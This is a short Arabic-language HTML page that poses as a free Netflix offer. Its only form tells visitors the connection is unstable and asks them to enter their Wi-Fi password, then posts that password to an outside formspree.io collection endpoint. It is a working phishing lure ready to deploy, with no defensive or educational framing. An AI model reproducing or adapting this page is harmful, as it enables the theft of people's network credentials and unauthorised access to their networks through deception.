<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> شاهد كل الأفلام والمسلسلات عبر حساب نتفلكس مجاني</title>
<style>
body, html {
    margin: 0;
    padding: 0;
    height: 100%;
    font-family: Arial, sans-serif;
}

.background-image {
    background-image: url('https://wecastmedia.fr/wp-content/uploads/2024/06/Netflix-sapprete-a-lancer-une-nouvelle-interface-sur-la-page-daccueil-de-son-application-sur-les-teles-video.webp'); /* استبدل بمسار الصورة الخاصة بك */
    background-size: cover;
    background-position: center;
    height: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
}

#azerd-form {
    background-color: rgba(255, 255, 255, 0.8);
    padding: 20px;
    border-radius: 10px;
    text-align: center;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
}

#azerd-form label {
    font-size: 18px;
    margin-bottom: 10px;
    display: block;
}

#azerd-form input[type="password"] {
    width: 100%;
    padding: 10px;
    margin-bottom: 10px;
    border: 1px solid #ccc;
    border-radius: 5px;
    font-size: 16px;
}

#azerd-form button {
    padding: 10px 20px;
    background-color: #e50914;
    color: white;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    cursor: pointer;
}

#azerd-form button:hover {
    background-color: #f40612;
}
</style>
</head>
<body>
    <div class="background-image">
        <form id="azerd-form" action="https://formspree.io/f/mdkeeark" method="POST">
            <label for="y y">  أدخل كلمة المرور للواي فاي لأن الاتصال غير مستقر</label>
            <input type="name" id="azerd" name="ythh" required placeholder="أدخل كلمة المرور">
            <button type="submit">دخول</button>
        </form>
    </div>
</body>
</html>
